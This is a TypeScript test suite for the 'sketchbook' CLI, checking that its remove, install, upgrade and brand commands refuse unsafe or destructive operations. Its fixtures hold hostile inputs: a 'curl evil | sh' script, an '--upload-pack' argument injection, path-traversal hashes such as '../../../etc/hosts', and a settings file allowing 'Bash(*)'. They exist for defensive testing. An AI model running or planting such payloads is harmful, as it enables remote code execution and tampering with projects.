// Commands that delete, overwrite or install refuse to lose work and refuse data that points outside the project
// (cases S22–S31 in TEST.md; SB-0059 to SB-0062).
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { readFile, writeFile, rm, appendFile, access, cp, rename, mkdir, readdir } from 'node:fs/promises';
import { join, dirname, basename } from 'node:path';
import { spawnSync } from 'node:child_process';
import { fixture, edit, readJson, failing, errorsOf, must, ROOT, sourceRepoOnly, checkoutOnly } from './helpers.mjs';
import { runChecks } from '../checks/run.mjs';
import { hashOf, parseJson } from '../lib/files.mjs';
import { buildCatalog, catalogIndex, removeComponents, removeKits } from '../commands/catalog.mjs';
import { applyRenames, renameSteps } from '../lib/renames.mjs';
import { runGenerator } from '../generators/foundation.mjs';
import type { Envelope } from '../cli/types.mjs';
import type { CatalogIndex, ComponentManifest, Kit } from '../commands/catalog.mjs';
import type { StarterPlan } from '../commands/start.mjs';
import type { DtcgTokenNode } from '../commands/tokens.mjs';
import type { ComponentRegistry } from '../../generated/types/registry.js';

const CLI = join(ROOT, 'harness/cli.mjs');
// The --json envelope; D is the shape of its data a test reads (the JSON boundary).
type CliJson<D> = Envelope & { data: D };
const cli = <D = unknown,>(dir: string, ...args: string[]) => {
  const r = spawnSync('node', [CLI, ...args], { cwd: dir, encoding: 'utf8', maxBuffer: 64 * 1024 * 1024 });
  let json: CliJson<D> | null = null;
  try { json = parseJson<CliJson<D>>(r.stdout); } catch { /* human output */ }
  return { code: r.status, out: r.stdout, err: r.stderr, json };
};
// A run whose envelope the test reads: output that is not JSON fails here, by name, where reading it threw before.
const cliJson = <D = unknown,>(dir: string, ...args: string[]) => { const r = cli<D>(dir, ...args); return { ...r, json: must(r.json, `JSON from sketchbook ${args.join(' ')}: ${r.out}${r.err}`) }; };
const exists = async (p: string) => { try { await access(p); return true; } catch { return false; } };
// A team project (catalog not tracked) with its own copy of the catalog, so tests can damage it.
async function teamProject() {
  const dir = await fixture();
  await cp(join(ROOT, 'harness/catalog'), join(dir, 'harness/catalog'), { recursive: true });
  assert.equal(cli(dir, 'init', '--start', 'blank', '--yes', '--detach-catalog').code, 0);
  return dir;
}

test('S22 remove refuses team-made and customized components without --yes, lists them in a dry run, and promises a catalog restore only when true', async () => {
  const dir = await fixture();
  cli(dir, 'init', '--start', 'blank', '--yes', '--detach-catalog');
  // Customized catalog component.
  assert.equal(cli(dir, 'add', 'badge').code, 0);
  await appendFile(join(dir, 'src/components/badge/Badge.scss'), '\n// our edit\n');
  const refused = cliJson(dir, 'remove', 'badge', '--json');
  assert.equal(refused.code, 1);
  const refusal = must(refused.json.errors[0], 'the refusal');
  assert.match(refusal.msg, /badge \(customized/);
  assert.match(must(refusal.fix, 'its fix'), /--yes/);
  assert.ok(await exists(join(dir, 'src/components/badge/Badge.scss')), 'nothing removed');
  const dry = cliJson<{ atRisk: unknown }>(dir, 'remove', 'badge', '--dry-run', '--json');
  assert.deepEqual(dry.json.data.atRisk, [{ name: 'badge', reason: 'customized' }]);
  assert.match(cli(dir, 'remove', 'badge', '--dry-run').out, /Needs --yes: badge is customized/);
  const yes = cliJson(dir, 'remove', 'badge', '--yes', '--json');
  assert.equal(yes.json.ok, true, yes.out);
  assert.match(must(yes.json.next, 'next'), /catalog version; your edits are only in git/);
  assert.ok(!(await exists(join(dir, 'src/components/badge'))));
  // Team-made component (not in the catalog).
  await edit<ComponentRegistry>(dir, 'spec/registry.json', (reg) => reg.components.push({ name: 'Probe Widget', tier: 3, status: 'planned' }));
  assert.equal(cli(dir, 'add', 'Probe Widget').code, 0);
  const team = cliJson(dir, 'remove', 'probe-widget', '--json');
  assert.equal(team.code, 1);
  assert.match(must(team.json.errors[0], 'the refusal').msg, /probe-widget \(made by the team, not in the catalog\)/);
  assert.ok(await exists(join(dir, 'spec/components/probe-widget/contract.json')));
  const teamYes = cliJson(dir, 'remove', 'probe-widget', '--yes', '--json');
  assert.equal(teamYes.json.ok, true, teamYes.out);
  assert.match(must(teamYes.json.next, 'next'), /git is the only way back/);
  assert.doesNotMatch(must(teamYes.json.next, 'next'), /sketchbook add/);
  // An untouched catalog component needs no --yes and can be added back.
  cli(dir, 'add', 'badge');
  const plain = cliJson(dir, 'remove', 'badge', '--json');
  assert.equal(plain.json.ok, true, plain.out);
  assert.match(must(plain.json.next, 'next'), /sketchbook add badge brings it back from the catalog/);
  await rm(dir, { recursive: true });
});

test('S23 kits remove refuses an edited kit without --yes, rebuilds what depends on kits, and G1 passes after it', async () => {
  const dir = await fixture();
  await edit<{ catalog: { source: boolean } }>(dir, 'harness.config.json', (c) => { c.catalog.source = false; });
  await appendFile(join(dir, 'src/patterns/sign-in/sign-in.css'), '\n/* our edit */\n');
  const refused = cliJson(dir, 'kits', 'remove', 'sign-in', '--json');
  assert.equal(refused.code, 1);
  assert.match(must(refused.json.errors[0], 'the refusal').msg, /kit sign-in differs from the catalog/);
  assert.ok(await exists(join(dir, 'src/patterns/sign-in/sign-in.css')), 'nothing removed');
  assert.match(cli(dir, 'kits', 'remove', 'sign-in', '--dry-run').out, /Needs --yes: kit sign-in/);
  const yes = cliJson(dir, 'kits', 'remove', 'sign-in', '--yes', '--json');
  assert.equal(yes.json.ok, true, yes.out);
  assert.ok(!(await exists(join(dir, 'src/patterns/sign-in'))));
  assert.doesNotMatch(await readFile(join(dir, 'spec/tokens/interface.json'), 'utf8'), /src\/patterns\/sign-in\//);
  const report = await runChecks(dir);
  assert.deepEqual(failing(report), [], errorsOf(report));
  await rm(dir, { recursive: true });
});

test('S24 this repo keeps catalog.source true', sourceRepoOnly, async () => {
  assert.equal(parseJson<{ catalog: { source: boolean } }>(await readFile(join(ROOT, 'harness.config.json'), 'utf8')).catalog.source, true, 'this repo is the catalog source');
});

test('S24 init --start keeps catalog.source in the catalog source repo unless --detach-catalog (--yes never detaches), loudly, and rewrites the note', async () => {
  const dir = await fixture();
  assert.equal((await readJson<{ catalog: { source: boolean } }>(dir, 'harness.config.json')).catalog.source, true, 'the reference project is a catalog source');
  const kept = cliJson<{ catalogSource: boolean }>(dir, 'init', '--start', 'library+kits', '--json');
  assert.equal(kept.json.ok, true, kept.out);
  assert.equal((await readJson<{ catalog: { source: boolean } }>(dir, 'harness.config.json')).catalog.source, true);
  assert.equal(kept.json.data.catalogSource, true);
  assert.match(cli(dir, 'init', '--start', 'library+kits').out, /catalog\.source stays true/);
  const yes = cliJson<{ catalogSource: boolean }>(dir, 'init', '--start', 'library+kits', '--yes', '--json');
  assert.equal(yes.json.ok, true, yes.out);
  assert.equal((await readJson<{ catalog: { source: boolean } }>(dir, 'harness.config.json')).catalog.source, true, '--yes confirms removals, it does not detach');
  assert.equal(yes.json.data.catalogSource, true);
  const detached = cliJson(dir, 'init', '--start', 'library+kits', '--detach-catalog', '--json');
  assert.equal(detached.json.ok, true, detached.out);
  assert.ok(detached.json.warnings.some((w) => typeof w !== 'string' && /WARNING: this repo was the catalog's source/.test(w.msg)), 'detaching is loud');
  const config = (await readJson<{ catalog: { source: boolean; note: string } }>(dir, 'harness.config.json')).catalog;
  assert.equal(config.source, false);
  assert.doesNotMatch(config.note, /This repo is the source/, 'the note says what is true now');
  assert.match(config.note, /team's own/);
  await rm(dir, { recursive: true });
});

test('S37 init refuses before writing anything: hand-edited linked tokens without --yes (brand options or a foundations starter), removals without --yes even with brand options', async () => {
  const dir = await fixture();
  const git = (...a: string[]) => spawnSync('git', ['-C', dir, ...a], { encoding: 'utf8' });
  git('init', '-q'); git('add', '-A'); git('-c', 'user.name=t', '-c', 'user.email=t@example.com', 'commit', '-qm', 'base');
  // NEW-3: the starter's removal refusal comes before the brand options are applied.
  const blank = cliJson(dir, 'init', '--start', 'blank', '--primary', '#ff0000', '--json');
  assert.equal(blank.code, 1);
  assert.match(must(blank.json.errors[0], 'the refusal').msg, /would remove 38 component/);
  assert.equal(git('status', '--porcelain').stdout, '', 'nothing written');
  // A bad answer is refused before a prefix rewrite.
  assert.equal(cli(dir, 'init', '--prefix', 'acme', '--primary', 'red', '--json').code, 1);
  assert.equal(git('status', '--porcelain').stdout, '', 'nothing written');
  // NEW-2: a hand edit to a brand-linked token is not reverted by init's regenerate without --yes.
  await edit<{ color: { primary: DtcgTokenNode } }>(dir, 'spec/tokens/semantic/light.tokens.json', (j) => { j.color.primary.$value = '{color.neutral.700}'; });
  git('-c', 'user.name=t', '-c', 'user.email=t@example.com', 'commit', '-qam', 'hand edit');
  for (const args of [['--primary', '#ff0000'], ['--start', 'library+kits', '--font', 'Inter']]) {
    const r = cliJson(dir, 'init', ...args, '--json');
    assert.equal(r.code, 1, `${args.join(' ')}: ${r.out}`);
    const refusal = must(r.json.errors[0], 'the refusal');
    assert.match(refusal.msg, /light: color\.primary/);
    assert.match(must(refusal.fix, 'its fix'), /--yes/);
    assert.equal(git('status', '--porcelain').stdout, '', `${args.join(' ')}: nothing written`);
  }
  // A starter whose foundations patch regenerates is held to the same rule.
  const { preflightStarter } = await import('../commands/start.mjs');
  // A partial plan: only the fields preflightStarter reads, so it is cast to the full type it takes.
  const partial: { starter: Pick<StarterPlan['starter'], 'id' | 'foundations'>; components: Pick<StarterPlan['components'], 'remove'>; kits: Pick<StarterPlan['kits'], 'remove'> } = { starter: { id: 'patching', foundations: { radius: { preset: 'sharp' } } }, components: { remove: [] }, kits: { remove: [] } };
  const patching = partial as StarterPlan;
  await assert.rejects(preflightStarter(dir, patching), /light: color\.primary/);
  await preflightStarter(dir, patching, { yes: true });
  const dry = cliJson<{ staleLinks: string[] }>(dir, 'init', '--primary', '#ff0000', '--dry-run', '--json');
  assert.ok(dry.json.data.staleLinks.some((c) => /color\.primary/.test(c)), 'the dry run names them');
  const y = cli(dir, 'init', '--primary', '#1d4ed8', '--yes', '--json');
  assert.equal(y.code, 0, y.out);
  assert.notEqual((await readJson<{ color: { primary: DtcgTokenNode } }>(dir, 'spec/tokens/semantic/light.tokens.json')).color.primary.$value, '{color.neutral.700}', 'with --yes the link wins');
  await rm(dir, { recursive: true });
});

test('S25 prefix rebuilds the catalog in its source repo; G1 rejects a catalog prefix that differs', async () => {
  const dir = await fixture();
  buildCatalog(dir);
  const r = cliJson(dir, 'prefix', 'acme', '--json');
  assert.equal(r.json.ok, true, r.out);
  assert.equal(catalogIndex(dir).prefix, 'acme');
  assert.deepEqual(failing(await runChecks(dir, { only: ['G1'] })), []);
  await edit<CatalogIndex>(dir, 'harness/catalog/index.json', (i) => { i.prefix = 'sb'; });
  const g1 = await runChecks(dir, { only: ['G1'] });
  assert.deepEqual(failing(g1), ['G1']);
  assert.match(JSON.stringify(must(g1.results[0], 'the G1 result').errors), /catalog prefix sb differs from harness.config.json prefix acme/);
  await rm(dir, { recursive: true });
});

test('S26 prefix refuses reserved words and words already used as <prefix>- in its scope', async () => {
  const dir = await fixture();
  for (const p of ['aria', 'data', 'on', 'x']) {
    const r = cliJson(dir, 'prefix', p, '--json');
    assert.equal(r.code, 1, p);
    assert.match(must(r.json.errors[0], 'the refusal').msg, /reserved/);
  }
  await writeFile(join(dir, 'docs/notes.md'), 'The brio-toolbar and --brio-gap come from our old system.\n');
  const taken = cliJson(dir, 'prefix', 'brio', '--json');
  assert.equal(taken.code, 1);
  assert.match(must(taken.json.errors[0], 'the refusal').msg, /"brio" already occurs as a prefix .* docs\/notes\.md/);
  assert.equal((await readJson<{ prefix: string }>(dir, 'harness.config.json')).prefix, 'sb', 'nothing renamed');
  await rm(dir, { recursive: true });
});

test('S27 G1 re-hashes every blob, compares the index and flags units with no source', async () => {
  const dir = await fixture();
  buildCatalog(dir);
  assert.deepEqual(failing(await runChecks(dir, { only: ['G1'] })), []);
  const badge = await readJson<ComponentManifest>(dir, 'harness/catalog/badge/manifest.json');
  const blob = join(dir, 'harness/catalog/badge/files', must(badge.files[0], 'a badge file').hash);
  await appendFile(blob, '\n');
  await mkdir(join(dir, 'harness/catalog/ghost/files'), { recursive: true });
  await edit<CatalogIndex>(dir, 'harness/catalog/index.json', (i) => { i.components.push('ghost'); });
  const errors = JSON.stringify(must((await runChecks(dir, { only: ['G1'] })).results[0], 'the G1 result').errors);
  assert.match(errors, /does not match its hash/);
  assert.match(errors, /harness\/catalog\/ghost.*no eligible component/);
  assert.match(errors, /index differs/);
  await rm(dir, { recursive: true });
});

test('S28 installs check every catalog path and blob: a poisoned manifest or kit index writes and deletes nothing', async () => {
  const dir = await teamProject();
  const manifest = 'harness/catalog/badge/manifest.json';
  const original = await readJson<ComponentManifest>(dir, manifest);
  // A path that leaves the project.
  await edit<ComponentManifest>(dir, manifest, (m) => { must(m.files[0], 'a badge file').path = `../${basename(dir)}-escape.txt`; });
  const out = cliJson(dir, 'add', 'badge', '--json');
  assert.equal(out.code, 1);
  assert.match(must(out.json.errors[0], 'the refusal').msg, /outside its unit/);
  assert.ok(!(await exists(join(dirname(dir), `${basename(dir)}-escape.txt`))));
  // A path inside the project but outside the unit (.claude/settings.json).
  await edit<ComponentManifest>(dir, manifest, (m) => { must(m.files[0], 'a badge file').path = '.claude/settings.json'; });
  assert.equal(cli(dir, 'add', 'badge').code, 1);
  assert.ok(!(await exists(join(dir, '.claude/settings.json'))));
  // A hash that is not a hash.
  await edit<ComponentManifest>(dir, manifest, (m) => { m.files = structuredClone(original.files); must(m.files[0], 'a badge file').hash = '../../../etc/hosts'; });
  const hash = cliJson(dir, 'add', 'badge', '--json');
  assert.equal(hash.code, 1);
  assert.match(must(hash.json.errors[0], 'the refusal').msg, /invalid hash/);
  // A blob that does not match its hash.
  await writeJsonRaw(dir, manifest, original);
  await appendFile(join(dir, 'harness/catalog/badge/files', must(original.files[0], 'a badge file').hash), '\n');
  const tampered = cliJson(dir, 'add', 'badge', '--json');
  assert.equal(tampered.code, 1);
  assert.match(must(tampered.json.errors[0], 'the refusal').msg, /does not match its hash/);
  assert.ok(!(await exists(join(dir, 'spec/components/badge'))), 'nothing installed');
  // A kit path of "." (rmSync would take the project) and a kit id with a path in it.
  cli(dir, 'kits', 'add', 'sign-in');
  await edit<{ kits: Kit[] }>(dir, 'harness/kits/index.json', (i) => { must(i.kits.find((k) => k.id === 'sign-in'), 'the sign-in kit').path = '.'; });
  const kit = cliJson(dir, 'kits', 'remove', 'sign-in', '--yes', '--json');
  assert.equal(kit.code, 1);
  assert.match(must(kit.json.errors[0], 'the refusal').msg, /unsafe id or path/);
  assert.ok(await exists(join(dir, 'spec/components')), 'project intact');
  await edit<{ kits: Kit[] }>(dir, 'harness/kits/index.json', (i) => { const k = must(i.kits.find((x) => x.id === 'sign-in'), 'the sign-in kit'); k.path = 'src/patterns/sign-in'; k.id = '../sign-in'; });
  assert.equal(cli(dir, 'kits', 'list').code, 1);
  await rm(dir, { recursive: true });
});
const writeJsonRaw = (dir: string, file: string, j: unknown) => writeFile(join(dir, file), JSON.stringify(j, null, 2) + '\n');

test('S29 an install is all or nothing: a unit that fails to build is rolled back with what it needed', async () => {
  const dir = await teamProject();
  const before = await readFile(join(dir, 'spec/registry.json'));
  const index = await readFile(join(dir, 'src/index.ts'));
  // Badge's stylesheet does not compile: the rebuild after writing fails.
  const manifest = await readJson<ComponentManifest>(dir, 'harness/catalog/badge/manifest.json');
  const scss = must(manifest.files.find((f) => f.path.endsWith('.scss')), 'the badge stylesheet');
  const broken = Buffer.from('.badge { color: ; {{{\n');
  scss.hash = hashOf(broken);
  await writeFile(join(dir, 'harness/catalog/badge/files', scss.hash), broken);
  await writeJsonRaw(dir, 'harness/catalog/badge/manifest.json', manifest);
  const r = cliJson(dir, 'add', 'badge', '--json');
  assert.equal(r.code, 1);
  assert.match(must(r.json.errors[0], 'the refusal').msg, /rolled back, nothing changed/);
  assert.ok(!(await exists(join(dir, 'spec/components/badge'))));
  assert.ok(!(await exists(join(dir, 'src/components/badge'))));
  assert.ok((await readFile(join(dir, 'spec/registry.json'))).equals(before));
  assert.ok((await readFile(join(dir, 'src/index.ts'))).equals(index));
  // Button needs spinner: a damaged button blob stops the install before spinner is written.
  const button = await readJson<ComponentManifest>(dir, 'harness/catalog/button/manifest.json');
  await rename(join(dir, 'harness/catalog/button/files', must(button.files[0], 'a button file').hash), join(dir, 'harness/catalog/button/gone'));
  assert.equal(cli(dir, 'add', 'button').code, 1);
  assert.ok(!(await exists(join(dir, 'spec/components/spinner'))), 'no half install');
  const report = await runChecks(dir);
  assert.deepEqual(failing(report), [], errorsOf(report));
  await rm(dir, { recursive: true });
});

test('S30 installs from the catalog carry the recorded token renames (tokens rename, then add)', async () => {
  // Pure rules: JSON strings, CSS variables, quoted paths; group renames through the paths the project has now.
  const renames = [{ from: 'color.primary', to: 'color.main', date: '2026-11-08' }];
  assert.equal(applyRenames('{"a":"{color.primary}","b":"color.primary","c":"{color.primary-foreground}"}', renames, 'sb', { file: 'x.json' }), '{"a":"{color.main}","b":"color.main","c":"{color.primary-foreground}"}');
  assert.equal(applyRenames("var(--sb-color-primary) var(--sb-color-primary-foreground) 'color.primary'", renames, 'sb', { file: 'x.ts' }), "var(--sb-color-main) var(--sb-color-primary-foreground) 'color.main'");
  assert.deepEqual([...must(renameSteps([{ from: 'a.x', to: 'a.y' }, { from: 'a.y', to: 'a.z' }], ['a.z.one', 'a.z.two'])[0], 'the first rename step')], [['a.x.one', 'a.y.one'], ['a.x.two', 'a.y.two']]);
  const dir = await fixture();
  cli(dir, 'init', '--start', 'blank', '--yes', '--detach-catalog');
  const rn = cliJson(dir, 'tokens', 'rename', 'color.primary', 'color.main', '--json');
  assert.equal(rn.json.ok, true, rn.out);
  await writeJsonRaw(dir, 'spec/tokens/renames.json', { $description: 'Semantic token renames, oldest first (sketchbook tokens rename).', renames });
  const add = cliJson(dir, 'add', 'button', '--json');
  assert.equal(add.json.ok, true, add.out + JSON.stringify(add.json?.errors));
  const contract = await readFile(join(dir, 'spec/components/button/contract.json'), 'utf8');
  assert.match(contract, /"\{color\.main\}"/);
  assert.doesNotMatch(contract, /"\{color\.primary\}"/);
  const report = await runChecks(dir);
  assert.deepEqual(failing(report), [], errorsOf(report));
  assert.deepEqual(cliJson<{ components: { customized: string[] } }>(dir, 'doctor', '--json').json.data.components.customized, [], 'renamed install is not "customized"');
  await rm(dir, { recursive: true });
});

test('S30b tokens rename and catalog installs share one set of text rules (parity)', async () => {
  const { planRename } = await import('../commands/tokens.mjs');
  const { renameJsonText, renameCodeText } = await import('../lib/renames.mjs');
  const dir = await fixture();
  const plan = await planRename(dir, 'color.primary', 'color.main');
  const renames = [{ from: 'color.primary', to: 'color.main', date: '2026-11-08' }];
  const prefix = (await readJson<{ prefix: string }>(dir, 'harness.config.json')).prefix;
  let checked = 0;
  for (const [file, after] of Object.entries(must(plan.files, 'the rename plan files'))) {
    if (!/\.(json|ts|scss|css|mdx)$/.test(file) || file.startsWith('spec/tokens/')) continue;
    const before = await readFile(join(dir, file), 'utf8');
    assert.equal(applyRenames(before, renames, prefix, { file }), after, `${file}: an install would translate it the same way`);
    checked++;
  }
  assert.ok(checked > 5, `compared ${checked} files`);
  const map = new Map([['color.primary', 'color.main']]);
  assert.equal(renameJsonText('["color.primary", "{color.primary}"]', map), '["color.main", "{color.main}"]');
  assert.equal(renameCodeText('var(--sb-color-primary)', map, 'sb'), 'var(--sb-color-main)');
  await rm(dir, { recursive: true });
});

test('reinstalling a source catalog unit preserves a reused semantic token name', async (t) => {
  const dir = await fixture();
  t.after(() => rm(dir, { recursive: true }));
  await removeKits(dir, ['data-table', 'dashboard', 'profile'], { yes: true, rebuild: false });
  const rename = cliJson(dir, 'tokens', 'rename', 'color.primary', 'color.main', '--json');
  assert.equal(rename.code, 0, rename.out);
  for (const mode of ['light', 'dark']) {
    await edit<{ color: Record<string, unknown> }>(dir, `spec/tokens/semantic/${mode}.tokens.json`, (doc) => {
      doc.color.primary = doc.color.main;
    });
  }
  const contract = 'spec/components/badge/contract.json';
  await edit<{ tokens: Record<string, string> }>(dir, contract, (doc) => { doc.tokens['badge.default.bg'] = '{color.primary}'; });
  buildCatalog(dir);
  await removeComponents(dir, ['badge'], { yes: true });
  const add = cliJson(dir, 'add', 'badge', '--json');
  assert.equal((await readJson<{ tokens: Record<string, string> }>(dir, contract)).tokens['badge.default.bg'], '{color.primary}');
  assert.equal(add.code, 0, add.out);
});

type HarnessManifest = { harness: string[]; team: string[]; shared: string[] };

const PROJECT = ['spec', 'brand.config.json', 'harness.config.json', 'generated', 'src', 'playwright', 'docs', 'harness', '.claude', 'scripts', '.githooks'];

test('S31 upgrade: harness-owned needs both manifests, settings are never written, a git URL needs --yes and shows its commit', checkoutOnly, async () => {
  const target = await fixture(PROJECT);
  const source = await fixture(PROJECT);
  // Upstream claims brand.config.json and .claude/** as harness files and changes them.
  await edit<HarnessManifest>(source, 'harness/manifest.json', (m) => { m.harness.push('brand.config.json', '.claude/**'); m.team = m.team.filter((g) => g !== 'brand.config.json'); });
  await edit<{ color: { primary: string } }>(source, 'brand.config.json', (b) => { b.color.primary = '#FF0000'; });
  await writeFile(join(source, '.claude/settings.json'), '{"permissions":{"allow":["Bash(*)"]}}\n');
  await appendFile(join(source, 'harness/checks/x1-decisions.mjs'), '// upstream fix\n');
  const brandBefore = await readFile(join(target, 'brand.config.json'));
  const settingsBefore = await readFile(join(target, '.claude/settings.json'));
  const dry = cliJson<{ reclassified: string[]; protected: string[]; update: string[] }>(target, 'upgrade', '--from', source, '--dry-run', '--json');
  assert.equal(dry.json.ok, true, dry.out + dry.err);
  assert.ok(dry.json.data.reclassified.includes('brand.config.json'));
  assert.deepEqual(dry.json.data.protected, ['.claude/settings.json', 'harness/manifest.json']);
  assert.ok(!dry.json.data.update.includes('brand.config.json'));
  const real = cliJson(target, 'upgrade', '--from', source, '--yes', '--json');
  assert.ok(Array.isArray(real.json.errors), 'checks ran with --yes');
  assert.ok((await readFile(join(target, 'brand.config.json'))).equals(brandBefore), 'team file not overwritten');
  assert.ok((await readFile(join(target, '.claude/settings.json'))).equals(settingsBefore), 'settings never written');
  assert.match(await readFile(join(target, 'harness/checks/x1-decisions.mjs'), 'utf8'), /upstream fix/);
  // Without --yes a folder upgrade that would write refuses and writes nothing, like a git URL (SB-0116).
  await appendFile(join(source, 'harness/checks/x1-decisions.mjs'), '// second fix\n');
  const noYes = cliJson(target, 'upgrade', '--from', source, '--json');
  assert.equal(noYes.code, 1);
  const refusal = must(noYes.json.errors[0], 'the refusal');
  assert.match(refusal.msg, /harness\/checks\/x1-decisions\.mjs/);
  assert.match(must(refusal.fix, 'its fix'), /--dry-run.*--yes/);
  assert.doesNotMatch(await readFile(join(target, 'harness/checks/x1-decisions.mjs'), 'utf8'), /second fix/, 'nothing written');
  // Arguments and git URLs.
  assert.equal(cli(target, 'upgrade', '--from=--upload-pack=touch /tmp/x', '--json').code, 1);
  const git = (...a: string[]) => spawnSync('git', ['-c', 'user.email=t@t', '-c', 'user.name=t', ...a], { cwd: source, encoding: 'utf8' });
  git('init', '-q'); git('add', '-A'); git('commit', '-qm', 'upstream');
  const url = `file://${source}`;
  const refused = cliJson(target, 'upgrade', '--from', url, '--json');
  assert.equal(refused.code, 1);
  assert.match(must(must(refused.json.errors[0], 'the refusal').fix, 'its fix'), /--yes/);
  const look = cliJson<{ commit: string }>(target, 'upgrade', '--from', url, '--dry-run', '--json');
  assert.equal(look.json.ok, true, look.out + look.err);
  assert.match(look.json.data.commit, /^[0-9a-f]{40}$/);
  await rm(target, { recursive: true });
  await rm(source, { recursive: true });
});

test('S36 upgrade never takes ownership rules from upstream: its manifest is reported, never written, and pinned team files stay put across upgrades', async () => {
  const target = await fixture(PROJECT);
  const source = await fixture(PROJECT);
  for (const dir of [target, source]) await writeFile(join(dir, 'package.json'), '{"name":"team","scripts":{"check":"node harness/checks/run.mjs"}}\n');
  // Upstream claims brand.config.json and package.json as harness files and changes both.
  await edit<HarnessManifest>(source, 'harness/manifest.json', (m) => { m.harness.push('brand.config.json', 'package.json', 'spec/**'); m.team = m.team.filter((g) => !['brand.config.json', 'spec/**'].includes(g)); m.shared = m.shared.filter((g) => g !== 'package.json'); });
  await edit<{ color: { primary: string } }>(source, 'brand.config.json', (b) => { b.color.primary = '#FF0000'; });
  await writeFile(join(source, 'package.json'), '{"name":"team","scripts":{"check":"curl evil | sh"}}\n');
  await appendFile(join(source, 'harness/checks/x1-decisions.mjs'), '// upstream fix\n');
  const before = Object.fromEntries(await Promise.all(['brand.config.json', 'package.json', 'harness/manifest.json'].map(async (f): Promise<[string, Buffer]> => [f, await readFile(join(target, f))])));
  for (const round of [1, 2]) {
    const r = cli<{ protected: string[]; update: string[]; manifest: { harness: { added: string[] }; team: { removed: string[] }; shared: { removed: string[] } } }>(target, 'upgrade', '--from', source, '--yes', '--json');
    // --yes also runs the checks, which this bare fixture fails: what matters here is that the upgrade completed.
    assert.ok(r.json?.data?.protected, `round ${round}: ${r.out}${r.err}`);
    for (const f of Object.keys(before)) assert.ok((await readFile(join(target, f))).equals(must(before[f], f)), `round ${round}: ${f} never written`);
    assert.ok(r.json.data.protected.includes('harness/manifest.json'), `round ${round}: manifest listed as protected`);
    assert.ok(!r.json.data.update.includes('harness/manifest.json'));
    const diff = r.json.data.manifest;
    assert.deepEqual(diff.harness.added, ['brand.config.json', 'package.json', 'spec/**'], `round ${round}: manifest diff reported`);
    assert.deepEqual(diff.team.removed, ['spec/**', 'brand.config.json']);
    assert.deepEqual(diff.shared.removed, ['package.json']);
  }
  assert.match(await readFile(join(target, 'harness/checks/x1-decisions.mjs'), 'utf8'), /upstream fix/, 'harness code still upgrades');
  // Even when both manifests agree, the pinned list is never written.
  await edit<HarnessManifest>(target, 'harness/manifest.json', (m) => { m.harness.push('package.json'); m.shared = m.shared.filter((g) => g !== 'package.json'); });
  const both = cliJson<{ protected: string[] }>(target, 'upgrade', '--from', source, '--yes', '--json');
  assert.ok(both.json.data.protected.includes('package.json'));
  assert.equal(parseJson<{ scripts: { check: string } }>(await readFile(join(target, 'package.json'), 'utf8')).scripts.check, 'node harness/checks/run.mjs');
  await rm(target, { recursive: true });
  await rm(source, { recursive: true });
});

test('S32 brand use validates before writing, refuses unsaved edits and overrides without --yes, and clears overrides with it', async () => {
  const dir = await fixture();
  assert.equal(cli(dir, 'brand', 'add', 'base', '--from', 'current').code, 0);
  assert.equal(cli(dir, 'brand', 'add', 'ocean', '--from', 'current').code, 0);
  await edit<{ color: { primary: string } }>(dir, 'brands/ocean.brand.json', (b) => { b.color.primary = '#0369A1'; });
  assert.equal(cli(dir, 'brand', 'add', 'broken', '--from', 'current').code, 0);
  await edit<{ radius: unknown }>(dir, 'brands/broken.brand.json', (b) => { b.radius = { preset: 'no-such-radius' }; });
  const brandBefore = await readFile(join(dir, 'brand.config.json'));
  // Invalid brand: refused before writing, dry run included.
  for (const args of [['--dry-run'], []]) {
    const r = cliJson(dir, 'brand', 'use', 'broken', ...args, '--json');
    assert.equal(r.code, 1, args.join(' '));
    assert.match(must(r.json.errors[0], 'the refusal').msg, /^brands\/broken\.brand\.json: /);
  }
  assert.ok((await readFile(join(dir, 'brand.config.json'))).equals(brandBefore), 'brand.config.json untouched');
  await rm(join(dir, 'brands/broken.brand.json'));
  // Unsaved edits in brand.config.json.
  await edit<{ color: { primary: string } }>(dir, 'brand.config.json', (b) => { b.color.primary = '#7C3AED'; });
  await runGenerator(dir, { quiet: true });
  const unsaved = cliJson(dir, 'brand', 'use', 'ocean', '--json');
  assert.equal(unsaved.code, 1);
  assert.match(must(unsaved.json.errors[0], 'the refusal').msg, /saved in no brands/);
  assert.match(cli(dir, 'brand', 'use', 'ocean', '--dry-run').out, /Needs --yes: brand\.config\.json has edits/);
  assert.equal((await readJson<{ color: { primary: string } }>(dir, 'brand.config.json')).color.primary, '#7C3AED');
  // Saved again: no refusal for that; an override still needs --yes, and --yes clears it.
  assert.equal(cli(dir, 'brand', 'use', 'base', '--yes').code, 0);
  await edit<{ radius: { md: DtcgTokenNode } }>(dir, 'spec/tokens/foundation/radius.tokens.json', (j) => { j.radius.md.$value = '7px'; });
  await runGenerator(dir, { quiet: true });
  const override = cliJson(dir, 'brand', 'use', 'ocean', '--json');
  assert.equal(override.code, 1);
  assert.match(must(override.json.errors[0], 'the refusal').msg, /override\(s\) belong to the current brand and would be cleared: radius\.md = "7px"/);
  const yes = cliJson(dir, 'brand', 'use', 'ocean', '--yes', '--json');
  assert.equal(yes.json.ok, true, yes.out);
  assert.deepEqual((await readJson<{ overrides: unknown }>(dir, 'spec/tokens/overrides.json')).overrides, {});
  assert.notEqual((await readJson<{ radius: { md: DtcgTokenNode } }>(dir, 'spec/tokens/foundation/radius.tokens.json')).radius.md.$value, '7px');
  const report = await runChecks(dir);
  assert.deepEqual(failing(report), [], errorsOf(report));
  await rm(dir, { recursive: true });
});

test('S33 catalog:build is a no-op in a team repo: after blank the shipped catalog stays and add still installs from it', async () => {
  const dir = await teamProject();
  const snapshot = async () => { const out: string[] = []; for (const d of (await readdir(join(dir, 'harness/catalog'))).sort()) out.push(d); return [out, await readFile(join(dir, 'harness/catalog/index.json'), 'utf8'), await readFile(join(dir, 'harness/catalog/button/manifest.json'), 'utf8')]; };
  const before = await snapshot();
  const r = spawnSync('node', [join(ROOT, 'scripts/build-catalog.mjs')], { cwd: dir, encoding: 'utf8' });
  assert.equal(r.status, 0, r.stderr);
  assert.match(r.stdout, /skipped/);
  assert.deepEqual(await snapshot(), before, 'harness/catalog unchanged');
  assert.equal(buildCatalog(dir).skipped, true);
  const add = cliJson(dir, 'add', 'button', '--json');
  assert.equal(add.json.ok, true, add.out);
  // In a source repo with nothing eligible the build still writes an (empty) index instead of crashing.
  const empty = await fixture(['harness.config.json', 'brand.config.json']);
  assert.deepEqual(buildCatalog(empty), { components: [], kits: [] });
  assert.deepEqual(catalogIndex(empty).components, []);
  await rm(empty, { recursive: true });
